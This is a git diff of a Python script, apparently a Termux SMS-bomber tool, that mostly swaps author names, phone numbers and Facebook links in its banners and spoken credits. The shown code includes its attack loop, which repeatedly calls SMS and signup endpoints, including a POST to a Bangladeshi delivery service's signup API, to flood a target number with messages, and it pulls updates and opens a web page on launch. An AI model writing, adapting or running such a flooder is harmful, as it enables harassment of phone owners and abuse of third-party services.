@@ -1,24 +1,26 @@
 import os
-print("\033[1;92m [[[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]]] {D-N-H  BOYS}SYSTEM INSTALL. . . . \033[1;30m")
+print("\033[1;92m [[[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]]] {B-A-D Vhut}SYSTEM INSTALL. . . . \033[1;30m")
 os.system("pkg install espeak")
 print("\033[1;92m   [[[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]]] ROBOT INSTALL COMPLETE \033[1;30m")
 os.system('espeak -a 300 "Robot install complete"')
-print("\033[1;92m   [[[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]]] UPDATE CHECKING BOSS D-N-H BOYS \033[1;30m")
-os.system('espeak -a 300 "WAITING FOR UPDATE BANGlADESH D-N-H BOYS OFF SRIEJOY "')
+print("\033[1;92m   [[[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]]] UPDATE CHECKING BOSS B-A-D Vhut \033[1;30m")
+os.system('espeak -a 300 "WAITING FOR UPDATE BANGlADESH B-A-D Vhut OFF Shuvo "')
 os.system("git pull")
 import os,requests,time
 time.sleep(1)
 os.system("clear")
-os.system("xdg-open https://www.facebook.com/groups/100090145877770/permalink/100090145877770/")
+os.system("xdg-open https://www.facebook.com/shuvo.ahammed.311")
 logo3=("""
- 
+
   ____            _     __      ___           _   
  |  _ \          | |    \ \    / / |         | |  
  | |_) | __ _  __| |_____\ \  / /| |__  _   _| |_ 
  |  _ < / _` |/ _` |______\ \/ / | '_ \| | | | __|
  | |_) | (_| | (_| |       \  /  | | | | |_| | |_ 
  |____/ \__,_|\__,_|        \/   |_| |_|\__,_|\__|
-                                                                                                                                                   
+                                                  
+                                                  
+                                                                                                               
 \x1b[38;5;196m╔═════════════╗  \033[38;5;46m🦋⃟Bad-Vhut𝄟⃝  \x1b[38;5;196m╔══════════════════╗
 \x1b[38;5;196m║\033[38;5;46m[D]\033[38;5;46m𝐀𝐔𝐓𝐇𝐎𝐑   \x1b[38;5;196m║  \033[38;5;46m🦋⃟Bad-Vhut𝄟⃝  \x1b[38;5;196m║\033[38;5;46mASHRAF MAHADE  \x1b[38;5;196m║
 \x1b[38;5;196m║\033[38;5;46m[N]\033[38;5;46m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊  \x1b[38;5;196m║  \033[38;5;46m🦋⃟Bad-Vhut𝄟⃝  \x1b[38;5;196m║\033[38;5;46mSRIEOY   \x1b[38;5;196m║
@@ -28,10 +30,10 @@ logo3=("""
 \x1b[38;5;196m║\033[38;5;46m[Y]\033[38;5;46m𝐈𝐌𝐎       \x1b[38;5;196m║  \033[38;5;46m🦋⃟Bad-Vhut𝄟⃝  \x1b[38;5;196m║\033[38;5;46m+8801408533661  \x1b[38;5;196m║
 \x1b[38;5;196m║\033[38;5;46m[S]\033[38;5;46m𝐅𝐑𝐎𝐌     \x1b[38;5;196m║  \033[38;5;46m🦋⃟Bad-Vhut𝄟⃝ \x1b[38;5;196m ║\033[38;5;46m𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇       \x1b[38;5;196m ║
 \x1b[38;5;196m╚═════════════╝  \033[38;5;46m🦋⃟Bad-Vhut𝄟⃝  \x1b[38;5;196m╚══════════════════╝\033[00m\033[1;30m""")
-os.system('espeak -a 300 "author Bad-Vhut "')
-os.system('espeak -a 300 "Facebook  SHUVO "')
+os.system('espeak -a 300 "author ASHRAF MAHADE "')
+os.system('espeak -a 300 "Facebook  Shuvo "')
 os.system('espeak -a 300 "whathapp + 8 8 0 1 8 6 2 8 8 2 9 6 5 "')
-os.system('espeak -a 300 "github B a d v h u t "')
+os.system('espeak -a 300 "github B A D - V H U T "')
 os.system('espeak -a 300 "telegram + 8 8 0 1 8 6 2 8 8 2 9 6 5 "')
 os.system('espeak -a 300 "imo + 8 8 0 1 8 6 2 8 8 2 9 6 5  "')
 os.system('espeak -a 300 "from Bangladesh "')
@@ -77,21 +79,21 @@ while amount>ses:
   sent1=requests.get(url1,headers=headers1)
   if sent1.status_code==200:
     ses+=1
-    print(f"\n{ses}  \033[38;5;46m🦋⃟Bad-vhut𝄟⃝  SMS WAS SENT☠️")
+    print(f"\n{ses}  \033[38;5;46m🦋⃟Bad-Vhut𝄟⃝  SMS WAS SENT☠️")
   else:
     pass
   
   sent2=requests.get(url2,headers=headers2)
   if sent2.status_code==200:
     ses+=1
-    print(f"\n{ses} \033[38;5;46m🦋⃟Bad-vhut𝄟⃝  SMS WAS SENT☠️")
+    print(f"\n{ses} \033[38;5;46m🦋⃟Bad-Vhut𝄟⃝  SMS WAS SENT☠️")
   else:
     pass
   
   send3=requests.post("https://api.redx.com.bd/v1/user/signup",headers=headers3,data=data)
   if send3.status_code==200:
     ses+=1
-    print(f"\n{ses} \033[38;5;46m🦋⃟Bad-vhut𝄟⃝  SMS WAS SENT☠️")
+    print(f"\n{ses} \033[38;5;46m🦋⃟Bad-Vhut𝄟⃝  SMS WAS SENT☠️")
     
   else:
     pass
@@ -106,7 +108,8 @@ print(""" \033[1;32m
  | |_) | (_| | (_| |       \  /  | | | | |_| | |_ 
  |____/ \__,_|\__,_|        \/   |_| |_|\__,_|\__|
                                                   
-                                                                                                                                                                  
+                                                  
+                                                                                                                
 \x1b[38;5;196m╔═════════════╗  \033[38;5;46m🦋⃟Bad-Vhut𝄟⃝  \x1b[38;5;196m╔══════════════════╗
 \x1b[38;5;196m║\033[38;5;46m[D]\033[38;5;46m𝐀𝐔𝐓𝐇𝐎𝐑   \x1b[38;5;196m║  \033[38;5;46m🦋⃟Bad-Vhut𝄟⃝  \x1b[38;5;196m║\033[38;5;46mASHRAF MAHADE  \x1b[38;5;196m║
 \x1b[38;5;196m║\033[38;5;46m[N]\033[38;5;46m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊  \x1b[38;5;196m║  \033[38;5;46m🦋⃟Bad-Vhut𝄟⃝  \x1b[38;5;196m║\033[38;5;46mSRIEOY   \x1b[38;5;196m║
